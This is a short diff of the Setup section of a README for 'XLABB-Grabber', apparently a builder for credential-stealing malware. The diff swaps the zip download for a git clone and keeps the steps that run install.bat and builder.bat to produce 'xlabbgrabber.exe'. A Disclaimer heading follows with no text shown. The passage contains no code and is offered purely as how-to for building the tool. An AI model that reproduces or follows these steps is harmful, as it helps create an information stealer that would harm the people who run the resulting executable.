@@ -94,11 +94,10 @@
 
 ### Setup
 
-1. [Download source code zip](https://github.com/benzoXdevr/XLABB-Grabber/archive/refs/heads/main.zip)
-2. Extract zip
-3. First install reqiured packages by double clicking `install.bat` file
-4. Run the builder by double clicking the `builder.bat` file
-5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `xlabbgrabber.exe`
+1. clone https://github.com/BenzoXdev/XLABB-Grabber.git
+2. First install reqiured packages by double clicking `install.bat` file
+3. Run the builder by double clicking the `builder.bat` file
+4. Follow instructions in builder and your exe will be found in the `dist` folder under the name `xlabbgrabber.exe`
 
 ## Disclaimer:
 
